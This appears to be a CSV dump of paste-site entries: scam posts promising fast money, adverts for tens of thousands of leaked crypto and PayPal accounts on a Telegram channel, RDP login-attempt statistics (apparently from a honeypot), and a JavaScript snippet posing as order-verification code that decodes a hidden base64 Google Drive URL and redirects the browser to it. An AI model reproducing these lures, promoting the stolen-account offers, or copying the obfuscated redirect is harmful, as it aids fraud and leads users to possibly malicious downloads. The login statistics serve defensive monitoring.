id,title,username,language,date,content
vuReEb9x,EARN $900 INSTANTLY 2025⭐ GV,Xavdsvrfwfrewffsfsd,JavaScript,Saturday 3rd of May 2025 07:20:10 PM CDT," 
Pdf https://tinyurl.com/freshleaks

rzTAoRE3bm
"
G1tX3gyr,Stake Free Balance Method,x2LeaF,JavaScript,Saturday 3rd of May 2025 07:18:24 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 53970
dYJ78jWD,Crypto Accounts,jm33,JavaScript,Saturday 3rd of May 2025 07:18:04 PM CDT,48468 Accounts Posted On https://t.me/leakzbyeminem
442SbD6t,2025-05-03_stats.json,rdp_snitch,JSON,Saturday 3rd of May 2025 07:18:00 PM CDT,"{
  ""ip"": {
    ""58.218.199.219"": 33,
    ""45.117.177.2"": 1971,
    ""211.185.207.14"": 39,
    ""193.176.22.13"": 12,
    ""161.35.201.228"": 249,
    ""111.89.163.100"": 33,
    ""43.134.40.227"": 45,
    ""165.154.224.90"": 69,
    ""80.94.95.198"": 30,
    ""185.196.75.63"": 6,
    ""91.238.181.92"": 12,
    ""71.82.170.60"": 42,
    ""45.227.254.152"": 6,
    ""198.235.24.52"": 9,
    ""157.245.104.150"": 6,
    ""62.60.188.24"": 36,
    ""198.235.24.72"": 9,
    ""193.176.23.4"": 6,
    ""199.45.155.64"": 3,
    ""178.128.161.150"": 3,
    ""91.108.248.64"": 84,
    ""205.210.31.86"": 9,
    ""152.53.244.181"": 3,
    ""88.214.50.18"": 6,
    ""209.97.169.106"": 3714,
    ""102.88.21.215"": 3,
    ""185.39.19.53"": 6,
    ""147.185.132.249"": 9,
    ""91.238.181.95"": 6
  },
  ""asn"": {
    ""AS4134"": 33,
    ""AS131353"": 1971,
    ""AS4766"": 39,
    ""Unknown"": 24,
    ""AS14061"": 3972,
    ""AS2514"": 33,
    ""AS132203"": 45,
    ""AS142002"": 69,
    ""AS204428"": 30,
    ""AS50837"": 6,
    ""AS49434"": 18,
    ""AS20115"": 42,
    ""AS267784"": 6,
    ""AS396982"": 36,
    ""AS215930"": 36,
    ""AS398722"": 3,
    ""AS215311"": 84,
    ""AS197540"": 3,
    ""AS29465"": 3,
    ""AS213021"": 6
  },
  ""isp"": {
    ""Chinanet"": 33,
    ""NHANHOA"": 1971,
    ""Korea Telecom"": 39,
    ""SIA \""Singularity Telecom\"""": 24,
    ""DigitalOcean, LLC"": 3972,
    ""NTT PC Communications, Inc."": 33,
    ""Shenzhen Tencent Computer Systems Company Limited"": 45,
    ""Scloud Pte Ltd"": 69,
    ""SS-Net"": 30,
    ""CLOUDSIGMA AG"": 6,
    ""Datacenter location PAR1 France"": 18,
    ""Charter Communications"": 42,
    ""Flyservers S.A."": 6,
    ""Google LLC"": 36,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 36,
    ""Censys, Inc."": 3,
    ""Regxa Company for Information Technology Ltd"": 84,
    ""netcup GmbH"": 3,
    ""MTN NIGERIA Communication limited"": 3,
    ""Prime LLC"": 6
  },
  ""org"": {
    ""Chinanet JS"": 33,
    ""Branch of Nhan Hoa Software Company"": 1971,
    ""Kornet"": 39,
    ""SIA \""Singularity Telecom\"""": 24,
    ""DigitalOcean, LLC"": 3969,
    ""InfoSphere"": 33,
    ""Tencent Cloud Computing"": 45,
    ""Scloud Pte Ltd"": 69,
    ""Unmanaged LTD"": 30,
    ""SIAFLEX Bilisim Anonim Sirketi"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""Spectrum"": 42,
    ""Xwin Universal LTD"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""UAB Host Baltic"": 36,
    ""Censys, Inc."": 3,
    ""Digitalocean"": 3,
    ""Unknown"": 84,
    ""netcup GmbH"": 3,
    ""MTN Nigeria"": 3,
    ""Prime LLC"": 6
  },
  ""regionName"": {
    ""Jiangsu"": 33,
    ""Ho Chi Minh"": 1971,
    ""Sejong-si"": 39,
    ""New York"": 24,
    ""Hesse"": 249,
    ""Tokyo"": 33,
    ""North West"": 45,
    ""Kowloon"": 72,
    ""Budapest"": 30,
    ""Denizli"": 6,
    ""\u00cele-de-France"": 18,
    ""Wisconsin"": 42,
    ""Vilnius"": 6,
    ""California"": 36,
    ""Karnataka"": 6,
    ""Tehran"": 36,
    ""England"": 3,
    ""Mazovia"": 84,
    ""Baden-Wurttemberg"": 3,
    ""South West"": 3714,
    ""Lagos"": 3,
    ""Moscow"": 6
  },
  ""country"": {
    ""China"": 33,
    ""Vietnam"": 1971,
    ""South Korea"": 39,
    ""United States"": 102,
    ""Germany"": 252,
    ""Japan"": 33,
    ""Singapore"": 3759,
    ""Hong Kong"": 72,
    ""Hungary"": 30,
    ""Turkey"": 6,
    ""France"": 18,
    ""Lithuania"": 6,
    ""India"": 6,
    ""Iran"": 36,
    ""United Kingdom"": 3,
    ""Poland"": 84,
    ""Nigeria"": 3,
    ""Russia"": 6
  },
  ""account"": {
    ""hello"": 6222,
    ""142.93.8.59"": 144,
    ""Domain"": 6,
    ""Test"": 36,
    ""FAovaZqyH"": 3,
    ""rhgTGU"": 3,
    ""cDugsg"": 3,
    ""rEFmYmAxS"": 3,
    ""CGYurA"": 3,
    ""OrEeTx"": 3,
    ""Administr"": 12,
    ""(empty)"": 3,
    ""mRotsBYLM"": 3,
    ""PUFVQn"": 3,
    ""vWsydj"": 3,
    ""yqSOiOvqi"": 3,
    ""vINdJI"": 3,
    ""MqqMxS"": 3
  },
  ""keyboard"": {
    ""Unknown"": 6459
  },
  ""client_build"": {
    ""Unknown"": 6459
  },
  ""client_name"": {
    ""Unknown"": 6459
  },
  ""ip_type"": {
    ""proxy"": 33,
    ""hosting"": 5796,
    ""Unknown"": 372,
    ""hosting & proxy"": 255,
    ""mobile & hosting"": 3
  }
}"
fLqZ87vq,Untitled,hubertzoo90,JavaScript,Saturday 3rd of May 2025 07:17:56 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56861/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3zK4z1Gq,2025-05-03_stats.json,rdp_snitch,JSON,Saturday 3rd of May 2025 07:16:05 PM CDT,"{
  ""ip"": {
    ""58.218.199.219"": 22,
    ""45.117.177.2"": 1314,
    ""211.185.207.14"": 26,
    ""193.176.22.13"": 8,
    ""161.35.201.228"": 166,
    ""111.89.163.100"": 22,
    ""43.134.40.227"": 30,
    ""165.154.224.90"": 46,
    ""80.94.95.198"": 20,
    ""185.196.75.63"": 4,
    ""91.238.181.92"": 8,
    ""71.82.170.60"": 28,
    ""45.227.254.152"": 4,
    ""198.235.24.52"": 6,
    ""157.245.104.150"": 4,
    ""62.60.188.24"": 24,
    ""198.235.24.72"": 6,
    ""193.176.23.4"": 4,
    ""199.45.155.64"": 2,
    ""178.128.161.150"": 2,
    ""91.108.248.64"": 56,
    ""205.210.31.86"": 6,
    ""152.53.244.181"": 2,
    ""88.214.50.18"": 4,
    ""209.97.169.106"": 2476,
    ""102.88.21.215"": 2,
    ""185.39.19.53"": 4,
    ""147.185.132.249"": 6,
    ""91.238.181.95"": 4
  },
  ""asn"": {
    ""AS4134"": 22,
    ""AS131353"": 1314,
    ""AS4766"": 26,
    ""Unknown"": 16,
    ""AS14061"": 2648,
    ""AS2514"": 22,
    ""AS132203"": 30,
    ""AS142002"": 46,
    ""AS204428"": 20,
    ""AS50837"": 4,
    ""AS49434"": 12,
    ""AS20115"": 28,
    ""AS267784"": 4,
    ""AS396982"": 24,
    ""AS215930"": 24,
    ""AS398722"": 2,
    ""AS215311"": 56,
    ""AS197540"": 2,
    ""AS29465"": 2,
    ""AS213021"": 4
  },
  ""isp"": {
    ""Chinanet"": 22,
    ""NHANHOA"": 1314,
    ""Korea Telecom"": 26,
    ""SIA \""Singularity Telecom\"""": 16,
    ""DigitalOcean, LLC"": 2648,
    ""NTT PC Communications, Inc."": 22,
    ""Shenzhen Tencent Computer Systems Company Limited"": 30,
    ""Scloud Pte Ltd"": 46,
    ""SS-Net"": 20,
    ""CLOUDSIGMA AG"": 4,
    ""Datacenter location PAR1 France"": 12,
    ""Charter Communications"": 28,
    ""Flyservers S.A."": 4,
    ""Google LLC"": 24,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 24,
    ""Censys, Inc."": 2,
    ""Regxa Company for Information Technology Ltd"": 56,
    ""netcup GmbH"": 2,
    ""MTN NIGERIA Communication limited"": 2,
    ""Prime LLC"": 4
  },
  ""org"": {
    ""Chinanet JS"": 22,
    ""Branch of Nhan Hoa Software Company"": 1314,
    ""Kornet"": 26,
    ""SIA \""Singularity Telecom\"""": 16,
    ""DigitalOcean, LLC"": 2646,
    ""InfoSphere"": 22,
    ""Tencent Cloud Computing"": 30,
    ""Scloud Pte Ltd"": 46,
    ""Unmanaged LTD"": 20,
    ""SIAFLEX Bilisim Anonim Sirketi"": 4,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Spectrum"": 28,
    ""Xwin Universal LTD"": 4,
    ""Palo Alto Networks, Inc"": 24,
    ""UAB Host Baltic"": 24,
    ""Censys, Inc."": 2,
    ""Digitalocean"": 2,
    ""Unknown"": 56,
    ""netcup GmbH"": 2,
    ""MTN Nigeria"": 2,
    ""Prime LLC"": 4
  },
  ""regionName"": {
    ""Jiangsu"": 22,
    ""Ho Chi Minh"": 1314,
    ""Sejong-si"": 26,
    ""New York"": 16,
    ""Hesse"": 166,
    ""Tokyo"": 22,
    ""North West"": 30,
    ""Kowloon"": 48,
    ""Budapest"": 20,
    ""Denizli"": 4,
    ""\u00cele-de-France"": 12,
    ""Wisconsin"": 28,
    ""Vilnius"": 4,
    ""California"": 24,
    ""Karnataka"": 4,
    ""Tehran"": 24,
    ""England"": 2,
    ""Mazovia"": 56,
    ""Baden-Wurttemberg"": 2,
    ""South West"": 2476,
    ""Lagos"": 2,
    ""Moscow"": 4
  },
  ""country"": {
    ""China"": 22,
    ""Vietnam"": 1314,
    ""South Korea"": 26,
    ""United States"": 68,
    ""Germany"": 168,
    ""Japan"": 22,
    ""Singapore"": 2506,
    ""Hong Kong"": 48,
    ""Hungary"": 20,
    ""Turkey"": 4,
    ""France"": 12,
    ""Lithuania"": 4,
    ""India"": 4,
    ""Iran"": 24,
    ""United Kingdom"": 2,
    ""Poland"": 56,
    ""Nigeria"": 2,
    ""Russia"": 4
  },
  ""account"": {
    ""hello"": 4148,
    ""142.93.8.59"": 96,
    ""Domain"": 4,
    ""Test"": 24,
    ""FAovaZqyH"": 2,
    ""rhgTGU"": 2,
    ""cDugsg"": 2,
    ""rEFmYmAxS"": 2,
    ""CGYurA"": 2,
    ""OrEeTx"": 2,
    ""Administr"": 8,
    ""(empty)"": 2,
    ""mRotsBYLM"": 2,
    ""PUFVQn"": 2,
    ""vWsydj"": 2,
    ""yqSOiOvqi"": 2,
    ""vINdJI"": 2,
    ""MqqMxS"": 2
  },
  ""keyboard"": {
    ""Unknown"": 4306
  },
  ""client_build"": {
    ""Unknown"": 4306
  },
  ""client_name"": {
    ""Unknown"": 4306
  },
  ""ip_type"": {
    ""proxy"": 22,
    ""hosting"": 3864,
    ""Unknown"": 248,
    ""hosting & proxy"": 170,
    ""mobile & hosting"": 2
  }
}"
JpqwVMfs,2025-05-03_stats.json,rdp_snitch,JSON,Saturday 3rd of May 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""58.218.199.219"": 11,
    ""45.117.177.2"": 657,
    ""211.185.207.14"": 13,
    ""193.176.22.13"": 4,
    ""161.35.201.228"": 83,
    ""111.89.163.100"": 11,
    ""43.134.40.227"": 15,
    ""165.154.224.90"": 23,
    ""80.94.95.198"": 10,
    ""185.196.75.63"": 2,
    ""91.238.181.92"": 4,
    ""71.82.170.60"": 14,
    ""45.227.254.152"": 2,
    ""198.235.24.52"": 3,
    ""157.245.104.150"": 2,
    ""62.60.188.24"": 12,
    ""198.235.24.72"": 3,
    ""193.176.23.4"": 2,
    ""199.45.155.64"": 1,
    ""178.128.161.150"": 1,
    ""91.108.248.64"": 28,
    ""205.210.31.86"": 3,
    ""152.53.244.181"": 1,
    ""88.214.50.18"": 2,
    ""209.97.169.106"": 1238,
    ""102.88.21.215"": 1,
    ""185.39.19.53"": 2,
    ""147.185.132.249"": 3,
    ""91.238.181.95"": 2
  },
  ""asn"": {
    ""AS4134"": 11,
    ""AS131353"": 657,
    ""AS4766"": 13,
    ""Unknown"": 8,
    ""AS14061"": 1324,
    ""AS2514"": 11,
    ""AS132203"": 15,
    ""AS142002"": 23,
    ""AS204428"": 10,
    ""AS50837"": 2,
    ""AS49434"": 6,
    ""AS20115"": 14,
    ""AS267784"": 2,
    ""AS396982"": 12,
    ""AS215930"": 12,
    ""AS398722"": 1,
    ""AS215311"": 28,
    ""AS197540"": 1,
    ""AS29465"": 1,
    ""AS213021"": 2
  },
  ""isp"": {
    ""Chinanet"": 11,
    ""NHANHOA"": 657,
    ""Korea Telecom"": 13,
    ""SIA \""Singularity Telecom\"""": 8,
    ""DigitalOcean, LLC"": 1324,
    ""NTT PC Communications, Inc."": 11,
    ""Shenzhen Tencent Computer Systems Company Limited"": 15,
    ""Scloud Pte Ltd"": 23,
    ""SS-Net"": 10,
    ""CLOUDSIGMA AG"": 2,
    ""Datacenter location PAR1 France"": 6,
    ""Charter Communications"": 14,
    ""Flyservers S.A."": 2,
    ""Google LLC"": 12,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 12,
    ""Censys, Inc."": 1,
    ""Regxa Company for Information Technology Ltd"": 28,
    ""netcup GmbH"": 1,
    ""MTN NIGERIA Communication limited"": 1,
    ""Prime LLC"": 2
  },
  ""org"": {
    ""Chinanet JS"": 11,
    ""Branch of Nhan Hoa Software Company"": 657,
    ""Kornet"": 13,
    ""SIA \""Singularity Telecom\"""": 8,
    ""DigitalOcean, LLC"": 1323,
    ""InfoSphere"": 11,
    ""Tencent Cloud Computing"": 15,
    ""Scloud Pte Ltd"": 23,
    ""Unmanaged LTD"": 10,
    ""SIAFLEX Bilisim Anonim Sirketi"": 2,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Spectrum"": 14,
    ""Xwin Universal LTD"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""UAB Host Baltic"": 12,
    ""Censys, Inc."": 1,
    ""Digitalocean"": 1,
    ""Unknown"": 28,
    ""netcup GmbH"": 1,
    ""MTN Nigeria"": 1,
    ""Prime LLC"": 2
  },
  ""regionName"": {
    ""Jiangsu"": 11,
    ""Ho Chi Minh"": 657,
    ""Sejong-si"": 13,
    ""New York"": 8,
    ""Hesse"": 83,
    ""Tokyo"": 11,
    ""North West"": 15,
    ""Kowloon"": 24,
    ""Budapest"": 10,
    ""Denizli"": 2,
    ""\u00cele-de-France"": 6,
    ""Wisconsin"": 14,
    ""Vilnius"": 2,
    ""California"": 12,
    ""Karnataka"": 2,
    ""Tehran"": 12,
    ""England"": 1,
    ""Mazovia"": 28,
    ""Baden-Wurttemberg"": 1,
    ""South West"": 1238,
    ""Lagos"": 1,
    ""Moscow"": 2
  },
  ""country"": {
    ""China"": 11,
    ""Vietnam"": 657,
    ""South Korea"": 13,
    ""United States"": 34,
    ""Germany"": 84,
    ""Japan"": 11,
    ""Singapore"": 1253,
    ""Hong Kong"": 24,
    ""Hungary"": 10,
    ""Turkey"": 2,
    ""France"": 6,
    ""Lithuania"": 2,
    ""India"": 2,
    ""Iran"": 12,
    ""United Kingdom"": 1,
    ""Poland"": 28,
    ""Nigeria"": 1,
    ""Russia"": 2
  },
  ""account"": {
    ""hello"": 2074,
    ""142.93.8.59"": 48,
    ""Domain"": 2,
    ""Test"": 12,
    ""FAovaZqyH"": 1,
    ""rhgTGU"": 1,
    ""cDugsg"": 1,
    ""rEFmYmAxS"": 1,
    ""CGYurA"": 1,
    ""OrEeTx"": 1,
    ""Administr"": 4,
    ""(empty)"": 1,
    ""mRotsBYLM"": 1,
    ""PUFVQn"": 1,
    ""vWsydj"": 1,
    ""yqSOiOvqi"": 1,
    ""vINdJI"": 1,
    ""MqqMxS"": 1
  },
  ""keyboard"": {
    ""Unknown"": 2153
  },
  ""client_build"": {
    ""Unknown"": 2153
  },
  ""client_name"": {
    ""Unknown"": 2153
  },
  ""ip_type"": {
    ""proxy"": 11,
    ""hosting"": 1932,
    ""Unknown"": 124,
    ""hosting & proxy"": 85,
    ""mobile & hosting"": 1
  }
}"
PeqYBnzK,Make $1000 15-MINUTES  (BEGINNER) YR,Xavdsvrfwfrewffsfsd,JavaScript,Saturday 3rd of May 2025 07:10:56 PM CDT," 
Pdf https://tinyurl.com/freshleaks

AxgeLxfADb
"
ykJzaX6a,Scam Casinos and Stores,x2LeaF,JavaScript,Saturday 3rd of May 2025 07:03:01 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 12971
NNnWu2zK,PayPal with Balance,jm33,JavaScript,Saturday 3rd of May 2025 07:02:43 PM CDT,37180 Accounts Posted On https://t.me/leakzbyeminem
